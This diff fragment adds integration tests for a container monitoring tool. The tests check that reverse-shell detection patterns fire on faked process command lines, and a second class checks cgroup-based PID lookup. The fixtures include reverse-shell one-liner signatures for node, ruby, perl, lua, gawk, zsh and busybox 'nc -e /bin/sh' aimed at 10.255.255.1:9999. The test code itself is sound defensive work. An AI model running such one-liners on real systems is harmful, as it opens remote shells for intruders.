+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for php fsockopen one-liner, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected high level, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_node_reverse_shell_exec_detected(self, test_workspace, coi_binary):
+        """The node-reverse-shell exec pattern fires when argv[0] is 'node' and both
+        'child_process' and 'net' appear in the cmdline.
+
+        Uses exec -a to set argv[0] to the Node one-liner signature on a sleep process so
+        PROC_EVENT_EXEC fires with the right cmdline without requiring node to be installed.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-69"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "69",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
+            time.sleep(3)
+
+            # Use exec -a to set argv[0] to the Node reverse-shell signature and run
+            # sleep as the actual process. PROC_EVENT_EXEC fires at execve time, and
+            # sleep keeps the process alive long enough to avoid a read race.
+            # Keywords 'child_process' and 'net' appear in the argv[0] string.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "exec -a 'node -e var sh=require(child_process);require(net).connect(9999)' sleep 10",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            # Poll until the proc_event threat appears (30 s timeout).
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern")
+                    == "node-reverse-shell"
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for node reverse-shell one-liner, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected high level, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def _run_exec_pattern_test(
+        self,
+        test_workspace,
+        coi_binary,
+        slot: int,
+        pattern_name: str,
+        exec_a_arg: str,
+    ):
+        """Verify a proc_event exec pattern fires using exec -a on a sleep process.
+
+        Uses exec -a to set argv[0] of sleep to the given signature string so that
+        PROC_EVENT_EXEC fires with the right cmdline without requiring the actual
+        binary to be installed in the container.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + f"-{slot}"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                str(slot),
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            time.sleep(3)  # allow monitoring daemon and PROC_EVENTS to initialise
+
+            # exec -a sets argv[0] of sleep to the suspicious signature so the
+            # proc_event watcher sees the right cmdline without needing the binary.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    f"exec -a '{exec_a_arg}' sleep 10",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern") == pattern_name
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for {pattern_name}, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected HIGH for {pattern_name}, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_ruby_socket_exec_detected(self, test_workspace, coi_binary):
+        """ruby-socket pattern fires when argv[0] starts with 'ruby' and '-rsocket' is in cmdline."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            70,
+            "ruby-socket",
+            "ruby -rsocket -e exit if fork",
+        )
+
+    def test_perl_socket_connect_exec_detected(self, test_workspace, coi_binary):
+        """perl-socket-connect pattern fires when argv[0] is 'perl' and 'sockaddr_in' is in cmdline."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            71,
+            "perl-socket-connect",
+            "perl -e use Socket;sockaddr_in(9999,inet_aton(host))",
+        )
+
+    def test_lua_socket_exec_detected(self, test_workspace, coi_binary):
+        """lua-socket pattern fires when argv[0] is 'lua' and both require('socket') and :connect( appear."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            72,
+            "lua-socket",
+            'lua -e local s=require("socket").tcp();s:connect("10.255.255.1",9999)',
+        )
+
+    def test_gawk_inet_exec_detected(self, test_workspace, coi_binary):
+        """gawk-inet pattern fires when argv[0] is 'gawk' and '/inet/tcp/' is in cmdline."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            73,
+            "gawk-inet",
+            "gawk /inet/tcp/0/10.255.255.1/9999",
+        )
+
+    def test_zsh_net_tcp_exec_detected(self, test_workspace, coi_binary):
+        """zsh-net-tcp pattern fires when argv[0] is 'zsh' and 'ztcp' is in cmdline."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            74,
+            "zsh-net-tcp",
+            "zsh -c ztcp 10.255.255.1 9999",
+        )
+
+    def test_busybox_nc_exec_detected(self, test_workspace, coi_binary):
+        """busybox-nc-exec pattern fires when argv[0] is 'busybox' and both 'nc' and '-e' appear."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            75,
+            "busybox-nc-exec",
+            "busybox nc -e /bin/sh 10.255.255.1 9999",
+        )
+
+
+class TestCgroupInitPID:
+    """Verify that the host-side cgroup.procs init-PID resolution works.
+
+    GetContainerInitPID now reads the minimum PID from cgroup.procs files
+    under the container's well-known cgroup path instead of calling
+    `incus info`. These tests confirm that the cgroup path exists and that
+    the PID found there matches the value reported by `incus info`.
+    """
+
+    def test_cgroup_path_exists_for_running_container(self, test_workspace, coi_binary):
+        """A running container's cgroup directory must exist at a well-known path."""
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-90"
+        )
+        proc = subprocess.Popen(
+            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "90"],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        try:
+            if not wait_for_container_running(container_name, timeout=30):
+                pytest.skip(f"Container {container_name} not ready")
+
+            cgroup_path = _find_container_cgroup_path(container_name)
+            if cgroup_path is None:
+                pytest.skip(
+                    f"Container cgroup path not found under /sys/fs/cgroup for {container_name}"
+                )
+            assert os.path.isdir(cgroup_path), f"cgroup path {cgroup_path} is not a directory"
+        finally:
+            proc.terminate()
+            subprocess.run(
+                [coi_binary, "container", "delete", container_name, "--force"],
+                check=False,
+                timeout=30,
+            )
+
+    def test_cgroup_procs_pid_matches_incus_info(self, test_workspace, coi_binary):
+        """The minimum PID in cgroup.procs must match the PID reported by incus info."""
+        import glob
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-91"
+        )
+        proc = subprocess.Popen(
+            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "91"],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        try:
+            if not wait_for_container_running(container_name, timeout=30):
+                pytest.skip(f"Container {container_name} not ready")
+
+            cgroup_path = _find_container_cgroup_path(container_name)
+            if cgroup_path is None:
+                pytest.skip(
+                    f"Container cgroup path not found under /sys/fs/cgroup for {container_name}"
+                )
+
+            # Collect minimum PID from all cgroup.procs files in the tree.
+            procs_files = glob.glob(f"{cgroup_path}/**/cgroup.procs", recursive=True)
+            procs_files.append(f"{cgroup_path}/cgroup.procs")
+            all_pids = []
+            for pf in procs_files:
+                try:
+                    with open(pf) as fh:
+                        for line in fh:
+                            line = line.strip()
+                            if line.isdigit():
+                                all_pids.append(int(line))
+                except OSError:
+                    pass
+            assert all_pids, f"No PIDs found under {cgroup_path}"
+            cgroup_pid = min(all_pids)
+
+            # Get PID from incus info.
+            result = subprocess.run(
+                ["incus", "info", container_name],
+                capture_output=True,
+                text=True,
+                timeout=10,
+            )
+            assert result.returncode == 0, f"incus info failed: {result.stderr}"
+            incus_pid = None
+            for line in result.stdout.splitlines():
+                stripped = line.strip()
+                if stripped.startswith("PID:") or stripped.startswith("Pid:"):
+                    parts = stripped.split()
+                    if len(parts) >= 2 and parts[1].isdigit():
+                        incus_pid = int(parts[1])
+                        break
+            assert incus_pid is not None, (
+                f"Could not parse PID from incus info output:\n{result.stdout}"
+            )
+
+            assert cgroup_pid == incus_pid, (
+                f"cgroup.procs min PID {cgroup_pid} != incus info PID {incus_pid}"
+            )
+        finally:
+            proc.terminate()
+            subprocess.run(
+                [coi_binary, "container", "delete", container_name, "--force"],
+                check=False,
+                timeout=30,
+            )
+
+
 # These end-to-end tests verify all monitoring aspects:
 # - Threat detection (reverse shells, env scanning, large file reads, network connections)
 # - Reverse shell patterns (netcat, bash, python, perl, php)
@@ -4018,6 +5559,7 @@ class TestExpandedEnvScanningPatterns:
 # - Disk space monitoring (WARNING when /tmp > 80% full)
 # - Large write detection (potential data exfiltration)
 # - Concurrent threat detection (multiple threats in same monitoring cycle)
+# - Fork bomb detection (process count spike → CRITICAL → auto-kill)
 #
 # Tests use background shell processes and direct container command injection
 # to avoid stdout/stderr blocking issues.
